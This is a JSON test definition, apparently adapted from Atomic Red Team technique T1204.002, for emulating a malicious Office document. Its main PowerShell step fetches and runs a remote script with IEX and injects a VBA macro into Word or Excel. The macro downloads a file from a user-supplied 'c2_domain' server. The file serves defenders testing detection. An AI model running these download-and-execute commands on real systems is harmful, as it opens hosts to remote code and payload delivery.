{
  "id": "5202ee05-c420-4148-bf5e-fd7f7d24850c",
  "name": "Office Generic Payload Download",
  "description": "This Test uses a VBA macro to launch Powershell which will download a file from a user defined web server.\nRequired input agruments are c2_domain and file_name\nExecution is handled by [Invoke-MalDoc](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\nExample for c2 server located at 127.0.0.1 for the file test.txt which is nested below the parent directory in the tests/my-test folder\nExample input args for file in root directory c2-domain = 127.0.0.1, file-name = test.txt\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "bc6262ce-039b-4560-b3ff-200efcc68981",
      "type": "execute-command",
      "data": {
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macroCode = Get-Content \"#{macro_path}\" -Raw\n$URL = \"#{c2_domain}\" + \"/\" + \"#{c2_parent_directory}\"\n$macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', \"#{file_name}\"\nInvoke-MalDoc -macroCode $macroCode -officeProduct \"#{ms_product}\"\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "c5c42a70-3fe4-40cd-920d-21babd165ff5",
      "type": "execute-command",
      "data": {
        "command": "Remove-Item \"C:\\Users\\$env:username\\Desktop\\#{file_name}\" -ErrorAction Ignore\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "83e33941-02cc-469f-9095-d6efbc6aa5b3",
      "name": "Check dependency 1/2",
      "description": "Destination c2_domain name or IP address must be set to a running HTTP server.\n",
      "type": "execute-command",
      "data": {
        "command": "if (#{c2_domain}) (exit 0) else (exit 1)\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "54ca6f67-051e-4444-ac5b-7f8753d71963",
      "name": "Resolve dependency 1/2",
      "description": "Destination c2_domain name or IP address must be set to a running HTTP server.\n",
      "type": "execute-command",
      "data": {
        "command": "Write-Host \"Destination c2 server domain name or IP address must be set and reachable for HTTP service\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "d550ac5b-3ad1-4ca1-9d85-fc0e0d8ede04",
      "name": "Re-check dependency 1/2",
      "description": "Destination c2_domain name or IP address must be set to a running HTTP server.\n",
      "type": "execute-command",
      "data": {
        "command": "if (#{c2_domain}) (exit 0) else (exit 1)\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "d41a6e60-9e46-48f8-bd3c-94fbb9e93092",
      "name": "Check dependency 2/2",
      "description": "Microsoftt #{ms_product} must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "2891bda5-8be8-494d-81ff-cea92ffde693",
      "name": "Resolve dependency 2/2",
      "description": "Microsoftt #{ms_product} must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "851756ae-8a95-4cda-9502-534acaf98864",
      "name": "Re-check dependency 2/2",
      "description": "Microsoftt #{ms_product} must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "bc6262ce-039b-4560-b3ff-200efcc68981",
      "p": "on-success",
      "o": "c5c42a70-3fe4-40cd-920d-21babd165ff5"
    },
    {
      "s": "bc6262ce-039b-4560-b3ff-200efcc68981",
      "p": "on-failure",
      "o": "c5c42a70-3fe4-40cd-920d-21babd165ff5"
    },
    {
      "s": "83e33941-02cc-469f-9095-d6efbc6aa5b3",
      "p": "on-success",
      "o": "bc6262ce-039b-4560-b3ff-200efcc68981"
    },
    {
      "s": "83e33941-02cc-469f-9095-d6efbc6aa5b3",
      "p": "on-failure",
      "o": "54ca6f67-051e-4444-ac5b-7f8753d71963"
    },
    {
      "s": "54ca6f67-051e-4444-ac5b-7f8753d71963",
      "p": "on-success",
      "o": "d550ac5b-3ad1-4ca1-9d85-fc0e0d8ede04"
    },
    {
      "s": "d550ac5b-3ad1-4ca1-9d85-fc0e0d8ede04",
      "p": "on-failure",
      "o": "bc6262ce-039b-4560-b3ff-200efcc68981"
    },
    {
      "s": "d41a6e60-9e46-48f8-bd3c-94fbb9e93092",
      "p": "on-success",
      "o": "bc6262ce-039b-4560-b3ff-200efcc68981"
    },
    {
      "s": "d41a6e60-9e46-48f8-bd3c-94fbb9e93092",
      "p": "on-failure",
      "o": "2891bda5-8be8-494d-81ff-cea92ffde693"
    },
    {
      "s": "2891bda5-8be8-494d-81ff-cea92ffde693",
      "p": "on-success",
      "o": "851756ae-8a95-4cda-9502-534acaf98864"
    },
    {
      "s": "851756ae-8a95-4cda-9502-534acaf98864",
      "p": "on-failure",
      "o": "bc6262ce-039b-4560-b3ff-200efcc68981"
    }
  ],
  "tags": [
    "T1204.002",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "c2_parent_directory",
      "type": "path",
      "description": "Parent directory where you have the \"malicious\" file on c2_domain server.\nWill default to root directory. Forward slashes are not needed at begining or ending of directory path\n",
      "value": ""
    },
    {
      "name": "file_name",
      "type": "string",
      "description": "\"Malicious\" file to be downloaded.\nThis required file needs to be place on the user provided c2 domain\nExample file can be found at PathToAtomicsFolder/T1204.002/src/test9-example-payload.txt\n",
      "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt"
    },
    {
      "name": "ms_product",
      "type": "string",
      "description": "Maldoc application Word or Excel\n",
      "value": "Word"
    },
    {
      "name": "macro_path",
      "type": "path",
      "description": "Location of file which will be converted to a VBA macro\n",
      "value": "PathToAtomicsFolder/T1204.002/src/test9-GenericPayloadDownload.txt"
    },
    {
      "name": "c2_domain",
      "type": "url",
      "description": "This required variable points to a user defined HTTP server that will host the file_name in the c2_parent_directory.\n",
      "value": ""
    }
  ]
}